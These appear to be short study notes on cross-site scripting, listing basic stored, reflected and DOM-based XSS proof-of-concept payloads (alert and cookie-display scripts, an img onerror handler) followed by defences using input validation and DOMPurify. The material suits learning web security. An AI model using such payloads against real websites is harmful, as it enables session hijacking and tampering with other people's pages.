## <img src="https://hackmd.io/_uploads/rJ_vxRola.png" width=60> <img src="https://hackmd.io/_uploads/rJSKT6ie6.png" width=60> [<span style=color:darkred>**Vulnerability Details**</span>](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#vulnerability-details)

### <span style=color:darkred>Persistent</span>
### <span style=color:red>Stored</span>
#### Payload
```javascript!
<script>alert(window.origin)</script>
```
```javascript!
<script>print()</script>
```
```javascript!
<script>alert(document.cookie)</script>
```

### <span style=color:darkred>Non-Persistent</span>
```javascript
// Must employ Social Engineer and specific URL to lure victim click
```
### <span style=color:red>Reflected XSS</span>
#### Payload
```javascript
http://SERVER_IP:PORT/index.php?task=<script>alert(window.origin)</script>
```

### <span style=color:red>DOM (Document Object Model) XSS</span>
#### Payload
```javascript
<img src="" onerror=alert(document.cookie)>
```
---
##  [<span style=color:>**DOMPurify**</span>](https://github.com/cure53/DOMPurify#dompurify)

### <span style=color:darkblue>From-End</span>
#### Input validation
```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```
#### Input Sanitization
```javascript
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
}
```

### <span style=color:darkblue>From-End</span>
